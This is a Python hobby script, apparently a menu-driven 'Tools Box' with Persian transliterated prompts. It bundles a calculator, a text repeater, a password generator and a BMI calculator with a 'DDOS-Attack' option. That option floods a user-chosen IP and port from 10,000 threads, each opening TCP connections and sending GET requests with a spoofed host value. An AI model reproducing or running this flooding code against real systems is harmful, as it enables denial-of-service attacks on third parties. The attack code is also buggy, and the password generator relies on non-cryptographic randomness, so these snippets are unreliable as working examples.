while(True):
    
    import pyfiglet
    from colorama import Fore
    from random import *
    import os

    Logo = (pyfiglet.figlet_format("Tools Box", font="puffy"))
    
    print(Fore.MAGENTA,(Logo))
    print("\n")
    
    print("[ ℂ𝕣𝕖𝕒𝕥𝕖𝕕 𝔹𝕪 𝕄𝕒𝕙𝕕𝕚 𝔸𝕣𝕚𝕒 ]")
    print("\n")
            
    
    
    first_name = input(" [ what's your first name  ] : ")
    
    print("\n")
    
    last_name = input(" [ what's your last name  ] : ")
    
    print("\n")
    
   # full_name = ("Full Name is :  ", first_name + last_name)
    
    age = int(input(" [ How Old Are You  ] : "))
    
    print("\n")
    
    if age <= 3:
        print(" [ in App Baraye Afrad Balaye 3 Sal Tarrahi Shode ] ")
        break

        print("\n")
        
    elif age > 3:
        Hamrahi = input(" [ Dost Dari ba Ma hamrah Bashi ??? y/n ] : ")
        if Hamrahi == "y" or Hamrahi == "yes":
            print("\n")
            print("[ Welcome ]")
            print("\n")
            
        elif Hamrahi == "n" or Hamrahi == "no":
            print(" [ Khosh Hal Shodam ] ")
            break
            
        else:
            print(" [ Lotfan Ba Deghat Vared Konid ] ")
            continue

        
    Options = input(" [ Baraye Raftan Be Options List -s- Ro Feshar Bedid  ] : ")
    
    if Options == "s" or Options == "start":
        
        print("\n")
        print(" [ App List is ] : ")  
        
        print("\n")
        
                                      
    Options_List = input(["Math", "Text-Repeater", "PassGenerator", "Calculate-BMI", "DDOS-Attack", " [ Which One ??? ] : "])
    print(Options_List)
    
    
    if Options_List == "Math":
        while(True):
            import pyfiglet
            import math            
            from colorama import Fore, Back, Style
        
            
            Logo = (pyfiglet.figlet_format("Math.py", font= "puffy"))
            print(Fore.CYAN,(Logo))
            
            
            print("[ ℂ𝕣𝕖𝕒𝕥𝕖𝕕 𝔹𝕪 𝕄𝕒𝕙𝕕𝕚 𝔸𝕣𝕚𝕒 ]")
            
            
            print("\n")
            
            
            start = input(" [ Baraye Start -s- ro feshar bedid ] : ")            
            if start == "s" or start == "start":
                print("\n")
                
                
                print("[ Bezan Berim ]")
                
                print("\n")
                
                
            else:
                print("\n")
                print(" [ Kellid Dorost Ro Bezan ] ")
                continue
        
            MathOP = input(" [ Yeki az Gozine Haro Entekhab Konid : + jam + ® - menha - ® * zarb * ® / taqsim / ® √ jazr √ ] : ")
            
            print("\n")
            
            
            if MathOP == "jam" or MathOP == "+": 
                print("[ OK ]")
                
                
                print("\n")
                
                
                one = int(input("Adad Aval : "))
                two = int(input("Adad Dovom : ")) 
                print("\n")
                print(one + two)
                
                
            elif MathOP == "menha" or MathOP == "-":
                print("\n")
                print("[ OK ]") 
                print("\n")
                
                
                one2 = int(input("Adad Aval : "))
                two2 = int(input("Adad Dovom : "))
                print("\n") 
                print(one2 - two2)
                
                
            elif MathOP == "zarb" or MathOP == "*":
                print("\n")  
                print("[ OK ]")
                
                
                print("\n")
                
                
                one3 = int(input("Adad Aval : "))
                two3 = int(input("Adad Dovom : "))
                print("\n")
                print(one3 * two3)
                
                
            elif MathOP == "taqsim" or MathOP == "/":  
                print("\n")
                print("[ OK ]")
                
                
                one4 = int(input("Adad Aval : "))
                two4 = int(input("Adad Dovom : "))
                print("\n")
                print(one4 / two4)
                
                
            elif MathOP == "jazr" or MathOP == "√":
                print("\n")
                print("[ OK ]")
                
                
                print("\n")
                
                
                one5 = int(input("Adad ra Vared Konid : "))  
                print("\n")  
                print(math.sqrt(one5))
                
                
                print("\n")
                
                
            else:
                 print(" Dorost Vared Konid ")
                
                 print("\n")
                
                
            Edame = input("Edame Midi Aya : y/n : ")
            
            
            print("\n")
                
                
            if Edame == "y" or Edame == "yes":
                print("\n")
                print("Kheyli ham Khoub !!! ")
                continue
            elif Edame == "n" or Edame == "no":
                    
                    
                    print("\n")
                    
                    
                    print("[ Good Bye ] ")                                        
                    print("\n")
                                
                    break    

                    
    elif Options_List == "Text-Repeater":
                             
        import pyfiglet
        from colorama import Fore, Back, Style
        
        Banner = pyfiglet.figlet_format("Text Repeater", font= "puffy")
        print(Fore.YELLOW, (Banner))

        print("\n")
                                                            
        print("[ ℂ𝕣𝕖𝕒𝕥𝕖𝕕 𝔹𝕪 𝕄𝕒𝕙𝕕𝕚 𝔸𝕣𝕚𝕒 ]")


        print("\n")
                    
        Text = input("Enter Your Text : ")
    
        print("\n")
    
        Repeat = (input("Chand Bar Tekrar Beshe : 100 : 1000 : 10000 : 100000 : "))
        
        if Repeat == "100": 
            repeat = Text * 100
            
        elif Repeat == "1000":
              repeat = Text * 1000
                
        elif Repeat == "10000":   
            repeat = Text * 10000    
                
        elif Repeat == "100000":  
            repeat = Text * 100000    
                
        else:
            print("\n")
            print("Dorost Vared Konid")
            continue
    
        print("\n")
        
        Chap = input("Chap She : y/n : ")
        if Chap == "y":  
            print(repeat) 
            continue
            
        elif Chap == "n":
            print(" [ Good Bye ] ")
            break 
        
    elif Options_List == "PassGenerator":
        while(True):
    
            import random
            import pyfiglet  
            from colorama import Fore,Back,Style
        
            
            Logo = pyfiglet.figlet_format("Password Generator", font= "slant")
            
            
            print(Fore.MAGENTA,(Logo))
             
            print("\n")
            
            
            reshte = input("Toool password => "); reshte = int(reshte)
            
            print("\n")
            
            
            print( ''.join([random.choice
                                (
                                    'abcdefghijklmnopqrstuvwxyz'
                                    +
                                    'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                                    +
                                    '!@#$%^&*()_+,><;./?`'
                                    +
                                    '1234567890'
                                    +
                                    'ا,ب,پ,ت,ث,ج,چ,ح,خ,د,ذ,ر,ز,ژ,س,ش,ص,ض,ط,ظ,ع,غ,ف,ق,ک,گ,ل,م,ن,و,ه,ی'

                                )
                                for i in range(reshte)]))
                                
                                
            print("\n")
              
            
                                                      
            Edame = input("Try Again :  y/n : ")
            
                                
            if Edame == "y" or Edame == "yes":
                
                
                print("\n")
                
                
                print(" [ Again ] ")
                
                
                continue
            
            
            elif Edame == "n" or Edame == "no":
                
                
                print("\n")
                
                
                print(" [ Close ] ")
                
                
                break
                                    
                                    
            print(Edame)
            
    elif Options_List == "Calculate-BMI":
        while True:
            import pyfiglet
            from colorama import Fore, Back, Style

            Logo = (pyfiglet.figlet_format("Calculate BMI", font= "puffy"))
    
    
            print(Fore.GREEN,(Logo))
    
            print("\n")
            
            print("[ ℂ𝕣𝕖𝕒𝕥𝕖𝕕 𝔹𝕪 𝕄𝕒𝕙𝕕𝕚 𝔸𝕣𝕚𝕒 ]")
    
            print("\n")
            
            name = input("ɴᴀᴍᴇ:")
            
            print("\n")
                                              
            vazn = input("ᴇɴᴛᴇʀ ʏᴏᴜʀᴇ ᴡᴇɪɢʜᴛ (ᴋɢ):")
            vazn_float = float(vazn)
     
            ghad = input("ᴇɴᴛᴇʀ ʏᴏᴜʀᴇ ʜᴇɪɢʜᴛ (ᴍ):")
            ghad_float = float(ghad)
            
            bmi = vazn_float / (ghad_float**2)
            
            if bmi < 16.5:
                        message = "ᴋᴀᴍʙᴏᴏᴅ ᴠᴀᴢɴ ꜱʜᴀᴅɪᴅ"
        
            elif 16.5 <= bmi < 18.5:
                        message = "ᴋᴀᴍʙᴏᴏᴅ ᴠᴀᴢɴ"
        
            elif 18.5 <= bmi < 25:
                        message = "ᴀᴅᴅɪ"
                        
            elif 25 <= bmi < 30:
                        message = "ᴇᴢᴀꜰᴇ ᴠᴀᴢɴ"
                                
            elif 30 <= bmi < 35:
                        message = "ᴄʜᴀɢʜɪ ᴄʟᴀꜱꜱ 1"
                                
            elif 35 <= bmi <= 40:
                message = "ᴄʜᴀɢʜɪ ᴄʟᴀꜱꜱ 2"
                
            elif 40 <= bmi:
                message = "ᴄʜᴀɢʜɪ ᴄʟᴀꜱꜱ 3"
                
            print ("ᴅᴇᴀʀ",name, "ʏᴏᴜʀᴇ ʙᴍɪ",bmi)    
            print("ꜱᴛᴀᴛᴜꜱ:")
            print(message)
            print("[ꜰɪɴɪꜱʜ]")

            print("\n")
                                    
            Edame = input("Edame Midi ? y/n : ")
            if Edame == "y" or Edame == "yes":
                continue
            
            elif Edame == "n" or Edame == "no":
                break

    elif Options_List == "DDOS-Attack":
        
        import pyfiglet
        from colorama import Fore, Back, Style
        import threading
        import socket

        Logo = (pyfiglet.figlet_format("DDOS", font= "puffy"))
    
    
        print(Fore.RED,(Logo))
        
        print("\n")
    
    
        print("[ ℂ𝕣𝕖𝕒𝕥𝕖𝕕 𝔹𝕪 𝕄𝕒𝕙𝕕𝕚 𝔸𝕣𝕚𝕒 ]")
    
        print("\n")
        
        target = input("Enter Target IP : ")
        
        Port = int(input("Enter Target PORT : "))
        
        Fake_IP = input("Enter Fake IP : ")
        
        def attack():
            
            Connect = 1
            
            while True:
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, Port))
                s.sendto(("GET / " + target + "HTTP/1.1\r\n").encode("ascii"), (target, Port))
                s.sendto(("HOST : " + Fake_IP + '\r\n\r\n').encode('ascii'), (target, Port))
                
                s.shutdown()        
                print(Connect)        
                Connect += 1
                
                
                
        for i in range(10000):
            
            thread = threading.Thread(target=attack)
            
            thread.start()        
            print(target)        
            print(Port)        
            print(Fake_IP)       
            print(attack)                
            print(thread)
            
    print("\n")        
            
    print(" [ Lotfan Dorost Vared Konid ] ")       
           
    print("\n")
    
                              
    Edame = input(" [ Dost Dari Tool Box ro Edame Bedi ??? y/n ] : ")
    if Edame == "y" or Edame == "yes":
        print("\n")
        print(" [ Kheyli Khosh Halam ] ")
        continue

    elif Edame == "n" or Edame == "no":
        print("\n")
        print(" [ Be Omid Didar ] " )
        break
                
